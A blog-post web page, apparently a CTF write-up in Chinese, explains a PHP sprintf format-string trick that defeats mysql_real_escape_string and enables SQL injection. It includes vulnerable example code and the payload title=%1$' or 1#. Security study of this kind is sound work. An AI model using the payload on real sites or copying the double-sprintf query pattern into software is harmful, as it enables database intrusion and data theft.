@@ -1,0 +1,296 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="utf-8">
+		<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+		<meta name="viewport" content="width=device-width, initial-scale=1">
+		 
+			
+  
+    <meta name="twitter:card" content="summary"/>
+    
+      <meta name="twitter:image" content="https://yang1k.github.io/images/avatar.png" />
+    
+  
+  
+  <meta name="twitter:title" content="PHP格式化字符串的漏洞"/>
+  <meta name="twitter:description" content="这是WordPress爆出的一个SQL漏洞，漏洞发生在WP的后台上传图片的位置，通过修改图片在数据库中的参数，以及利用php的sprintf函数的特性，在删除图片时，导致&rsquo;单引号的逃逸。漏洞利用较为困难。
+"/>
+  
+  
+  
+  
+    <meta name="twitter:creator" content="@Yang1k"/>
+  
+
+
+
+		
+		<meta name="author" content="Yang1k">
+		<meta name="description" content="Site Description">
+		<meta name="generator" content="Hugo 0.56.0" />
+		<title>PHP格式化字符串的漏洞 &middot; Yang1k</title>
+		<link rel="shortcut icon" href="https://yang1k.github.io/images/favicon.ico">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/style.css">
+		<link rel="stylesheet" href="https://yang1k.github.io/css/highlight.css">
+
+		
+		<link rel="stylesheet" href="https://yang1k.github.io/css/font-awesome.min.css">
+		
+
+		
+		<link href="https://yang1k.github.io/index.xml" rel="alternate" type="application/rss+xml" title="Yang1k" />
+		
+
+		
+	</head>
+
+    <body>
+       <nav class="main-nav">
+	
+	
+		<a href='https://yang1k.github.io/'> <span class="arrow">←</span>Home</a>
+	
+	<a href='https://yang1k.github.io/post'>Archive</a>
+	<a href='https://yang1k.github.io/tags'>Tags</a>
+	<a href='https://yang1k.github.io/about'>About</a>
+
+	
+
+	
+	<a class="" href="https://yang1k.github.io/index.xml">RSS</a>
+	
+</nav>
+
+
+        <section id="wrapper" class="post">
+            <article>
+                <header>
+                    <h1>
+                        PHP格式化字符串的漏洞
+                    </h1>
+                    <h2 class="headline">
+                    Nov 23, 2017 09:54
+                    · 211 words
+                    · 1 minute read
+                      <span class="tags">
+                      
+                      
+                          
+                              <a href="https://yang1k.github.io/tags/ctf">ctf</a>
+                          
+                      
+                      
+                      </span>
+                    </h2>
+                </header>
+                
+                  
+                    <div id="toc">
+                      <nav id="TableOfContents">
+<ul>
+<li>
+<ul>
+<li>
+<ul>
+<li><a href="#漏洞函数">漏洞函数</a></li>
+<li><a href="#利用条件">利用条件</a></li>
+<li><a href="#漏洞利用">漏洞利用</a></li>
+<li><a href="#参考链接">参考链接</a></li>
+</ul></li>
+</ul></li>
+</ul>
+</nav>
+                    </div>
+                  
+                
+                <section id="post-body">
+                    <p>这是WordPress爆出的一个SQL漏洞，漏洞发生在WP的后台上传图片的位置，通过修改图片在数据库中的参数，以及利用php的sprintf函数的特性，在删除图片时，导致&rsquo;单引号的逃逸。漏洞利用较为困难。
+<!-- more --></p>
+
+<h3 id="漏洞函数">漏洞函数</h3>
+
+<p>该漏洞利用了两个函数，一个是常见的mysql_real_escape_string()函数，另一个是 sprintf()函数。</p>
+
+<p>mysql_real_escape_string()函数的作用是转义sql语句中的特殊字符，即会将单引号(&lsquo;)变为(\&lsquo;)。</p>
+
+<p>sprint()是把百分号（%）符号替换成一个作为参数进行传递的变量，类似于C的占位符。</p>
+
+<p>示例：</p>
+
+<pre><code>&lt;?php 
+$a = 'abc';
+$b = 'def';
+
+
+echo sprintf(&quot; '%s' \n &quot;,$a,$b);
+echo &quot;&lt;br&gt;&quot;;
+echo sprintf(&quot; '%y' \n &quot;,$a);
+echo &quot;&lt;br&gt;&quot;;
+echo sprintf(&quot; '%\' \n &quot;,$a);
+
+ ?&gt;
+ 输出结果
+ 'abc' 
+'' 
+''
+</code></pre>
+
+<p>由上测试可知(%\ )会被当成格式化字符串，输出为空。</p>
+
+<h3 id="利用条件">利用条件</h3>
+
+<p>1.执行语句使用sprintf或vsrptinf进行拼接</p>
+
+<p>2.执行语句进行了两次拼接，第一次拼接的参数内容可控，类似如下代码：</p>
+
+<pre><code>&lt;?php
+
+$input = mysql_real_escape_string(&quot;%1$' and 1=1#&quot;);
+$b = sprintf(&quot;AND b='%s'&quot;, $input);
+...
+$sql = sprintf(&quot;SELECT * FROM t WHERE a='%s' $b&quot;, 'admin');
+echo $sql;
+//result: SELECT * FROM t WHERE a='admin' AND b=' ' and 1=1#'
+</code></pre>
+
+<p>以上这就是一个简单的漏洞利用示例</p>
+
+<h3 id="漏洞利用">漏洞利用</h3>
+
+<p>这段代码就是admin.php中存在漏洞的代码。</p>
+
+<pre><code>if(isset($_GET['id'])){
+	$id = mysql_real_escape_string($_GET['id']);
+	if(isset($_GET['title'])){
+		$title = mysql_real_escape_string($_GET['title']);
+		$title = sprintf(&quot;AND title='%s'&quot;, $title);  #用sprintf第一次对$title处理。
+	}else{
+		$title = '';
+	}
+	$sql = sprintf(&quot;SELECT * FROM article WHERE id='%s' $title&quot;, $id); #第二次使用sprintf还有$title变量
+	$result = mysql_query($sql,$con);
+	$row = mysql_fetch_array($result);
+	if(isset($row['title'])&amp;&amp;isset($row['content'])){
+		echo &quot;&lt;h1&gt;&quot;.$row['title'].&quot;&lt;/h1&gt;&lt;br&gt;&quot;.$row['content'];
+		die();
+	}else{
+		die(&quot;This article does not exist.&quot;);
+	}
+}
+</code></pre>
+
+<p>在这里 对$title有两次处理，所以存在漏洞。</p>
+
+<ul>
+<li>构造$title为title=%&rsquo; or 1#</li>
+<li>sprintf第一次处理后$title=%\&rsquo; or 1#</li>
+
+<li><p>sprintf第二次处理时，整个代码如下：</p>
+
+<pre><code>$sql = sprintf(&quot;SELECT * FROM article WHERE id='%s' $title&quot;, $id);
+#title传入后
+$sql = sprintf(&quot;SELECT * FROM article WHERE id='%s' AND title='%\' or 1#'&quot;, $id);
+</code></pre></li>
+
+<li><p>这个时候sprintf函数就会将(\ )吃掉，但是这时会报一个sprintf参数不足的错误，因为这个函数里有两个格式化字符(%S,%\ )但是只有一个参数($id)，不过PHP的格式化字符串还有另一种表示方法%1$s，其中%后面的数字就表示引用第几个参数，$后面是格式化字符串的类型，例：</p>
+
+<pre><code>$a = 'abc';
+$b = 'def';
+echo sprintf(' %2$s,%1$s',$b,$a);
+// 结果
+def,abc
+</code></pre></li>
+
+<li><p>由上可构造title=%1$&rsquo; or 1#,这样就不会有参数不足的问题这样最后的代码如下：</p>
+
+<pre><code>$id=1
+$sql = sprintf(&quot;SELECT * FROM article WHERE id='%s' AND title='%1$\' or 1#'&quot;, $id);
+echo $sql;
+//结果
+SELECT * FROM article WHERE id='1' AND title='' or 1#
+</code></pre></li>
+</ul>
+
+<h3 id="参考链接">参考链接</h3>
+
+<p><a href="https://github.com/LCTF/LCTF2017/blob/master/src/web/simple-blog/web-f1sh-writeup.md">https://github.com/LCTF/LCTF2017/blob/master/src/web/simple-blog/web-f1sh-writeup.md</a></p>
+
+<p><a href="https://paper.seebug.org/386/">https://paper.seebug.org/386/</a></p>
+                </section>
+            </article>
+
+            
+                <a class="twitter" href="https://twitter.com/intent/tweet?text=https%3a%2f%2fyang1k.github.io%2ftypecho%2fpost%2fphp%25E6%25A0%25BC%25E5%25BC%258F%25E5%258C%2596%25E5%25AD%2597%25E7%25AC%25A6%25E4%25B8%25B2%25E7%259A%2584%25E6%25BC%258F%25E6%25B4%259E%2f - PHP%e6%a0%bc%e5%bc%8f%e5%8c%96%e5%ad%97%e7%ac%a6%e4%b8%b2%e7%9a%84%e6%bc%8f%e6%b4%9e "><span class="icon-twitter"> tweet</span></a>
+
+<a class="facebook" href="#" onclick="
+    window.open(
+      'https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(location.href),
+      'facebook-share-dialog',
+      'width=626,height=436');
+    return false;"><span class="icon-facebook-rect"> Share</span>
+</a>
+
+            
+
+            
+                <div id="disqus_thread"></div>
+<script type="text/javascript">
+    var disqus_shortname = 'your_disqus_short_name'; 
+
+     
+    (function() {
+        var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+
+            
+
+            
+
+            <footer id="footer">
+    
+    <p class="small">
+    
+       © Copyright 2020 <i class="fa fa-heart" aria-hidden="true"></i> Yang1k
+    
+    </p>
+    <p class="small">
+        Powered by <a href="http://www.gohugo.io/">Hugo</a> Theme By <a href="https://github.com/nodejh/hugo-theme-cactus-plus">nodejh</a>
+    </p>
+</footer>
+
+        </section>
+
+        <script src="https://yang1k.github.io/js/jquery-3.3.1.min.js"></script>
+<script src="https://yang1k.github.io/js/main.js"></script>
+<script src="https://yang1k.github.io/js/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+
+
+
+  
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'your_google_analytics_id', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+
+
+
+    </body>
+</html>
